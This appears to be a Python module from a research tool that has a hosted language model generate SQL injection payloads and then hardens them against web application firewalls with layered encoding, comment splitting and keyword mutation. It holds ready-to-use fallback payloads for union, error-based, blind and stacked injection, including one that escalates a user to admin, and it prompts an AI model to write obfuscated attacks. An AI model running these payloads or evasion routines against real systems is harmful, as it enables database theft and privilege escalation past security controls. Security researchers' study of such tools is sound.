"""Tier 2 — Context-Aware Payload Generation (Phi-3-Mini analog via GapGPT).

Given a strategy chosen by the Q-learning layer and the observable target
context, this module asks a small, efficient hosted model to synthesise a
single implementation-ready SQLi payload. Prompts incorporate the target
syntax (database) and WAF presence, exactly as described in Section III
("Prompt Engineering").

A deterministic offline synthesiser provides obfuscated payloads when the API
is unavailable, so the full pipeline remains runnable and reproducible.
"""
from __future__ import annotations

import random
import re
from typing import Dict

from .config import LLMConfig
from .llm_client import LLMClient

_SYSTEM = (
    "You are an authorized penetration-testing assistant operating ONLY against "
    "a local, sandboxed, intentionally-vulnerable target in a controlled lab. "
    "Produce exactly one SQL injection payload for the requested technique, tuned "
    "to the given database syntax, and obfuscated to evade signature-based WAFs "
    "when a WAF is present. Output ONLY the raw payload on a single line, with no "
    "explanation, code fences, or commentary."
)

_USER_TEMPLATE = (
    "Lab target context:\n"
    "- Web framework: {framework}\n"
    "- Database: {database}\n"
    "- WAF present: {waf}\n"
    "- Testing phase: {phase}\n"
    "- Required technique: {strategy}\n\n"
    "Return one {strategy} SQL injection payload for {database}."
)

_WAF_EVASION_GUIDANCE = (
    "\nWAF EVASION TECHNIQUES TO CONSIDER:\n"
    "- Use character encoding: hex (0x...), URL encoding (%xx), Unicode escapes\n"
    "- Fragment keywords with comments: un/**/ion, se/**/lect, fr/**/om\n"
    "- Alternate operators: <=> instead of =, BETWEEN instead of >\n"
    "- String literals as hex: 'admin' -> 0x61646d696e\n"
    "- Stacked obfuscation: combine multiple techniques\n"
    "- Alternative functions: BENCHMARK/SLEEP, LOAD_FILE/LOAD_BLOB, etc.\n"
    "- MySQL versioned comments: /*!50000SELECT*/ to hide from simple string matching"
)


def _insert_inline_comments(token: str) -> str:
    chars = [c for c in token if c.isalnum()]
    if len(chars) < 4:
        return token
    return "/**/".join(chars)


def _mixed_case(token: str, rng: random.Random) -> str:
    out = []
    for ch in token:
        if ch.isalpha():
            out.append(ch.upper() if rng.random() < 0.5 else ch.lower())
        else:
            out.append(ch)
    return "".join(out)


def _hex_encode_string(s: str) -> str:
    """Encode string as hex (0x...)."""
    if not s:
        return s
    hex_str = "".join(f"{ord(c):02x}" for c in s)
    return f"0x{hex_str}"


def _url_encode(s: str, skip_alphanumeric: bool = True) -> str:
    """URL encode a string, optionally preserving alphanumeric."""
    out = []
    for c in s:
        if skip_alphanumeric and c.isalnum():
            out.append(c)
        elif c == ' ':
            out.append('%20')
        elif c in "/*-+().,;:[]{}\"'=<>":
            out.append(f"%{ord(c):02x}")
        else:
            out.append(c)
    return "".join(out)


def _double_url_encode(s: str) -> str:
    """Double URL encoding for aggressive obfuscation."""
    return _url_encode(_url_encode(s, skip_alphanumeric=False), skip_alphanumeric=False)


def _unicode_escape(s: str) -> str:
    """Convert to unicode escape sequences \\uXXXX or &#NNN;."""
    out = []
    for c in s:
        if c.isalnum() or c == ' ':
            out.append(c)
        else:
            out.append(f"&#x{ord(c):04x};")
    return "".join(out)


def _sql_comment_nested(token: str, rng: random.Random) -> str:
    """Nest SQL comments in various ways."""
    modes = [
        lambda t: f"/*{t}*/",
        lambda t: f"/*!50000{t}*/",
        lambda t: f"/*! {t} */",
        lambda t: f"/*? {t}*/",
        lambda t: f"/**/{t}/**/",
    ]
    return rng.choice(modes)(token.upper())


def _case_alternation(s: str, rng: random.Random) -> str:
    """More aggressive case alternation."""
    out = []
    for i, ch in enumerate(s):
        if ch.isalpha():
            if i % 3 == 0:
                out.append(ch.upper())
            elif i % 3 == 1:
                out.append(ch.lower())
            else:
                out.append(rng.choice([ch.upper(), ch.lower()]))
        else:
            out.append(ch)
    return "".join(out)
# -- offline fallback payload templates (already lightly obfuscated) --------- #
_OFFLINE_TEMPLATES: Dict[str, list] = {
    "union_based": [
        "'/**/UnIoN/**/SeLeCt/**/NULL,CoNcAt(0x7e,user())-- -",
        "-1'/**/union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables-- -",
    ],
    "error_based": [
        "'/**/AnD/**/ExTrAcTvAlUe(1,CoNcAt(0x7e,(SeLeCt/**/version())))-- -",
        "'+(select(1)from(select(updatexml(1,concat(0x7e,user()),1)))a)+'",
    ],
    "boolean_blind": [
        "'/**/oR/**/(SeLeCt/**/substr(user(),1,1))=char(114)-- -",
        "'/**/aNd/**/0x31=0x31/**/aNd/**/'a'='a",
    ],
    "time_blind": [
        "'/**/oR/**/sLeEp(5)#",
        "'%3balt%65r/**/session/**/--",
    ],
    "stacked_queries": [
        "1%3b/**/uPdAtE/**/users/**/sEt/**/role=char(97,100,109,105,110)/**/wHeRe/**/id=1-- -",
        "1';/**/select/**/pg_sleep(2)-- -",
    ],
    "second_order": [
        "admin'/**/-- stored payload reflected on profile read; CoNcAt(0x7e,user())",
        "x'/**/||/**/(select user())/**/||'",
    ],
}


def _clean_payload(raw: str) -> str:
    """Extract a single-line payload from a possibly chatty LLM response."""
    if not raw:
        return ""
    text = raw.strip()
    # Strip code fences.
    text = re.sub(r"^```[a-zA-Z]*\n?|```$", "", text).strip()
    # Take the first non-empty line that looks like a payload.
    for line in text.splitlines():
        line = line.strip().strip("`")
        if not line:
            continue
        # Drop common prose prefixes.
        line = re.sub(r"^(payload|answer|sql)\s*[:\-]\s*", "", line, flags=re.I)
        return line[:512]
    return text[:512]


class PayloadGenerator:
    """Tier 2 payload synthesiser."""

    def __init__(self, client: LLMClient, cfg: LLMConfig, seed: int = 42, use_cache: bool = True) -> None:
        self.client = client
        self.cfg = cfg
        self._rng = random.Random(seed)
        self.offline_used = 0
        self.use_cache = use_cache

    def generate(
        self,
        strategy: str,
        context: Dict[str, str],
        attempt: int = 0,
        feedback: str = "",
    ) -> str:
        variation = ""
        if attempt > 0:
            variation = (
                f"\nThis is alternative attempt #{attempt + 1}. Produce a DISTINCT payload "
                f"using different obfuscation/encoding than earlier attempts to better evade "
                f"signature-based WAFs."
            )
        if feedback:
            variation += f"\nFeedback from previous attempt: {feedback}."
        
        user = _USER_TEMPLATE.format(strategy=strategy, **context)
        
        # Add WAF evasion guidance if WAF is present
        if str(context.get("waf", "")).lower() in {"present", "true", "1", "yes"}:
            user += _WAF_EVASION_GUIDANCE
            # Add escalation guidance based on attempt number
            if attempt == 0:
                user += "\n- Priority: Diverse obfuscation techniques"
            elif attempt == 1:
                user += "\n- Priority: Character and keyword encoding with URL encoding"
            elif attempt >= 2:
                user += "\n- Priority: Aggressive multi-layer encoding and semantic variations"
        
        user += variation
        
        content = self.client.chat(
            model=self.cfg.payload_model,
            system=_SYSTEM,
            user=user,
            temperature=self.cfg.payload_temperature,
            use_cache=self.use_cache,
        )
        payload = _clean_payload(content) if content else ""
        if not payload:
            payload = self._offline(strategy)
        if str(context.get("waf", "")).lower() in {"present", "true", "1", "yes"}:
            payload = self._harden_for_waf(payload, strategy=strategy, context=context, attempt=attempt)
        return payload

    def _harden_for_waf(self, payload: str, strategy: str, context: Dict[str, str], attempt: int) -> str:
        """Apply escalating polymorphic rewrites for signature-based WAF evasion.
        
        Multi-level strategy with attempt-based escalation:
        - Attempt 0: Simple obfuscation (case, comments, whitespace)
        - Attempt 1: Encoding chains (URL + hex)
        - Attempt 2: Double encoding + aggressive keyword mutation
        - Attempt 3+: Maximum obfuscation with stacked techniques
        """
        if not payload:
            return payload

        db = str(context.get("database", "mysql")).lower()
        p = payload[:512]
        
        # Escalation level determines aggressiveness
        escalation = min(attempt, 3)  # 0-3 scale
        
        # ===== LEVEL 0: Basic Obfuscation (attempts 0-1) =====
        if escalation <= 1:
            p = self._basic_obfuscate(p, db, attempt)
        
        # ===== LEVEL 1: Encoding Chains (attempts 1-2) =====
        if escalation >= 1:
            p = self._apply_encoding_chain(p, escalation, attempt)
        
        # ===== LEVEL 2: Aggressive Keyword Mutation (attempts 2+) =====
        if escalation >= 2:
            p = self._aggressive_keyword_mutation(p, db, attempt)
        
        # ===== LEVEL 3: Maximum Obfuscation (attempts 3+) =====
        if escalation >= 3:
            p = self._maximum_obfuscation(p, db, attempt)
        
        return p[:512]

    def _basic_obfuscate(self, payload: str, db: str, attempt: int) -> str:
        """Basic obfuscation: whitespace rotation + case variation."""
        # Rotate whitespace/comment style per attempt
        separators = ["/**/", "%0a", "%09", "/*%20*/", "/**/%20/**/"]
        sep = separators[attempt % len(separators)]
        p = re.sub(r"\s+", sep, payload)
        
        # Apply case alternation to keywords
        keyword_patterns = [
            r"\bunion\b", r"\bselect\b", r"\bfrom\b", r"\bwhere\b",
            r"\band\b", r"\bor\b", r"\bnot\b", r"\bin\b",
        ]
        
        for pat in keyword_patterns:
            p = re.sub(pat, lambda m: _case_alternation(m.group(0), self._rng), p, flags=re.I)
        
        return p

    def _apply_encoding_chain(self, payload: str, escalation: int, attempt: int) -> str:
        """Apply chained encoding: URL, hex, unicode."""
        p = payload
        
        # Escalation 1: URL encode special chars
        if escalation >= 1:
            p = _url_encode(p, skip_alphanumeric=True)
        
        # Escalation 2: Double encoding on certain components
        if escalation >= 2 and attempt % 2 == 1:
            # Selectively double-encode operators and keywords
            p = re.sub(r"([=<>!;()\[\]])", lambda m: _double_url_encode(m.group(0)), p)
        
        return p

    def _aggressive_keyword_mutation(self, payload: str, db: str, attempt: int) -> str:
        """Apply aggressive transformations to keywords to evade CRS signatures."""
        p = payload
        
        keyword_modes = {
            r"\bselect\b": [
                lambda x: _sql_comment_nested(x, self._rng),
                lambda x: f"s/**/e/**/l/**/e/**/c/**/t",
                lambda x: f"s{self._rng.choice(['%', '/**/'])}{self._rng.choice(['*', '0'])}e{self._rng.choice(['%', '/**/'])}{self._rng.choice(['*', '0'])}l...",
            ],
            r"\bunion\b": [
                lambda x: _sql_comment_nested(x, self._rng),
                lambda x: f"u/**/n/**/i/**/o/**/n",
                lambda x: f"un%69on",  # URL encode 'i'
            ],
            r"\bfrom\b": [
                lambda x: _sql_comment_nested(x, self._rng),
                lambda x: f"fr%6fm",  # URL encode 'o'
                lambda x: f"f/**/r/**/o/**/m",
            ],
            r"\bwhere\b": [
                lambda x: _sql_comment_nested(x, self._rng),
                lambda x: f"wh%65re",  # URL encode 'e'
            ],
            r"\band\b": [
                lambda x: _sql_comment_nested(x, self._rng),
                lambda x: f"a%6ed",  # URL encode 'n'
                lambda x: f"a/**/n/**/d",
            ],
            r"\bor\b": [
                lambda x: _sql_comment_nested(x, self._rng),
                lambda x: f"o%72",  # URL encode 'r'
            ],
        }
        
        for pat, transforms in keyword_modes.items():
            transform_fn = transforms[attempt % len(transforms)]
            p = re.sub(pat, lambda m: transform_fn(m.group(0)), p, flags=re.I)
        
        return p

    def _maximum_obfuscation(self, payload: str, db: str, attempt: int) -> str:
        """Maximum obfuscation: combine all techniques and add semantic variations."""
        p = payload
        
        # Apply MySQL-specific bypasses
        if db == "mysql":
            # Convert SLEEP to BENCHMARK (often bypasses timing-based detection)
            p = re.sub(
                r"sleep\s*\(\s*(\d+)\s*\)",
                lambda m: f"benchmark({m.group(1)}00000,md5(1))",
                p, flags=re.I
            )
            # Convert = to <=> (NULL-safe equal, less detected)
            if attempt % 3 == 0:
                p = re.sub(r"(?<![<>!])=(?!>|=)", "<=>", p)
        
        # Encode string literals with hex
        string_pattern = r"'([^']*)'"
        matches = list(re.finditer(string_pattern, p))
        for match in reversed(matches):  # reverse to maintain indices
            original = match.group(1)
            encoded = _hex_encode_string(original)
            p = p[:match.start()] + encoded + p[match.end():]
        
        # Add random null bytes or Unicode spaces
        if attempt % 2 == 0:
            p = re.sub(r"(?<=[a-z])\s+(?=[a-z])", lambda m: f"{self._rng.choice(['%0b', '%0c'])}", p, flags=re.I)
        
        return p

    def _old_harden_for_waf(self, payload: str, strategy: str, context: Dict[str, str], attempt: int) -> str:
        """Legacy simple hardening (kept for reference)."""
        if not payload:
            return payload

        db = str(context.get("database", "mysql")).lower()
        p = payload[:512]

        # Rotate whitespace/comment style per attempt for diversity.
        separators = ["/**/", "%0a", "%09"]
        sep = separators[attempt % len(separators)]
        p = re.sub(r"\s+", sep, p)

        keyword_patterns = [
            r"union", r"select", r"from", r"where", r"and", r"or", r"sleep",
            r"benchmark", r"extractvalue", r"updatexml", r"information_schema", r"concat",
        ]

        def keyword_rewriter(match: re.Match) -> str:
            kw = match.group(0)
            mode = attempt % 3
            if mode == 0:
                return _mixed_case(kw, self._rng)
            if mode == 1:
                return _insert_inline_comments(kw)
            # MySQL versioned comments are often useful for bypassing filters.
            if db == "mysql":
                return f"/*!50000{kw.upper()}*/"
            return _mixed_case(kw, self._rng)

        for pat in keyword_patterns:
            p = re.sub(rf"\b{pat}\b", keyword_rewriter, p, flags=re.I)

        # Rotate quoting/comment variants to avoid static signatures.
        if attempt % 2 == 1:
            p = p.replace("'", "%27")
        if "--" in p and attempt % 2 == 0:
            p = p.replace("--", "%23")

        # Encourage time-based bypass alternatives that commonly evade filters.
        if strategy == "time_blind" and "sleep" in p.lower() and db == "mysql":
            p = re.sub(r"sleep\s*\(\s*(\d+)\s*\)", r"benchmark(\g<1>00000,md5(1))", p, flags=re.I)

        return p[:512]

    def _offline(self, strategy: str) -> str:
        self.offline_used += 1
        templates = _OFFLINE_TEMPLATES.get(strategy, _OFFLINE_TEMPLATES["union_based"])
        return self._rng.choice(templates)
